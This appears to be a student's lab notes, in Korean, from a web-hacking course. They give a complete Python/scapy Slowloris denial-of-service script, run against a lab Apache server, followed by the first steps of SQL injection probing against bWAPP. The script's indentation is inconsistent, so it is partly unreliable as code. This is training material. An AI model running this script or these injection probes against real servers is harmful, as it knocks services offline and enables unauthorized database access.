# (Day 7) Slowloris Attack

## Slowloris Attack

- HTTP 요청 헤더와 본문이 개행문자로 구분되는 특징을 이용한 공격
- 헤더의 끝을 나타내는 개행문자를 전달하지 않아 서버가 연결을 유지하도록 하는 공격

## [실습] scapy를 활용

- **Kally #2**
- `gedit slowloris.py`    slowloris 파일 생성

    #! /usr/bin/env python
    
    import sys
    import time
    from scapy.all import *
    
    def slowloris (target, num) :
        print "start connect > {}".format(target)
        syn = []
        for i in range(num) :
            syn.append(IP(dst=target)/TCP(sport=RandNum(1024,65535),dport=80,flags='S'))
    		
    		syn_ack = sr(syn, verbose=0)[0]
    	
    	ack = []
    	for sa in syn_ack :
    	    payload = "GET /{} HTTP/1.1\r\n".format(str(RandNum(1,num))) +\
    	    "Host: {}\r\n".format(target) +\
    	    "User-Agent: Mozilla/4.0\r\n" +\
    	    "Content-Length: 42\r\n"
    	
    	    ack.append(IP(dst=target)/TCP(sport=sa[1].dport,dport=80,flags="A",seq=sa[1].ack,ack=sa[1].seq+1)/payload)
    	
    	answer = sr(ack, verbose=0)[0]
    	print "{} connection success!\t Fail: {}".format(len(answer), num-len(answer))
    	print "Sending data \"X-a: b\\r\\n\".."
    	
    	count = 1
    	while True :
    	    print "{} time sending".format(count)
    	    ack = []
    	    for ans in answer :
    	        ack.append(IP(dst=target)/TCP(sport=ans[1].dport,dport=80,flags="PA",seq=ans[1].ack,ack=ans[1].seq)/"X-a: b\r\n")
    	    answer = sr(ack, inter=0.5, verbose=0)[0]
    	    time.sleep(10)
    	    count += 1
    
    if __name__ == "__main__" :
        if len(sys.argv) < 3 :
            print "Usage: {} <target> <number of connection>".format(sys.argv[0])
            sys.exit(1)
        slowloris(sys.argv[1], int(sys.argv[2]))

- **Kally #1**
    - 서버 재기동
    `service apache2 stop`
    `service apache2 start`
    - 서버 상태 확인 (브라우저) [localhost/server-status](http://localhost/server-status)
- **Kally #2**
    - `python [slowloris.py](http://slowloris.py/) KALI#1_IP 50`
    50개의 패킷을 Kalli #1에게 전송

        ![Day%207%20Slowloris%20Attack/Untitled.png](images/Day%207%20Slowloris%20Attack/Untitled.png)

- **Kally #1의 브라우저 (localhost/server-status)**
- 50개의 패킷 요청을 읽고 있음

    ![Day%207%20Slowloris%20Attack/Untitled%201.png](images/Day%207%20Slowloris%20Attack/Untitled%201.png)

- Kally #1
    - mysql 서버 재기동
    service mysql start
- Kally #2
    - (브라우저) Kally #1의 bWAPP 로 접속 `Kally #1_ip /bWAPP`

        ![Day%207%20Slowloris%20Attack/Untitled%202.png](images/Day%207%20Slowloris%20Attack/Untitled%202.png)

        영화 조회 서비스

        ---

        [화면]
        제목 : man

        [전달 ← 요청 파라미터를 통해 전달]

        sqli_1.php?=title=man

        [사용 → 쿼리문을 만드는데 사용될 것으로 유추]
        select * from movies where title = '%man%'

        ![Day%207%20Slowloris%20Attack/Untitled%203.png](images/Day%207%20Slowloris%20Attack/Untitled%203.png)

        입력값이 전달/사용 과정에서 조작이 발생하는지를 확인할 때

        ---

        화면]
        제목 : man'

        [전달 ← 요청 파라미터를 통해 전달]

        sqli_1.php?=title=man'

        [사용 → 쿼리문을 만드는데 사용될 것으로 유추]
        select * from movies where title = '%man'%'

        ![Day%207%20Slowloris%20Attack/Untitled%204.png](images/Day%207%20Slowloris%20Attack/Untitled%204.png)

        ⇒ 백엔드 db가 mysql이라는 정보와 화면에서 입력한 값은 그대로 쿼리의 생성/실행에 활용됨

        - 정상적인 쿼리가 반환하는 컬럼의 개수를 확인

        ![Day%207%20Slowloris%20Attack/Untitled%205.png](images/Day%207%20Slowloris%20Attack/Untitled%205.png)

        ![Day%207%20Slowloris%20Attack/Untitled%206.png](images/Day%207%20Slowloris%20Attack/Untitled%206.png)

- 웹 해킹 관련 서적
    - 클라이언트 side :
    - 서버 side : 웹 해킹 & 보안 완벽 가이드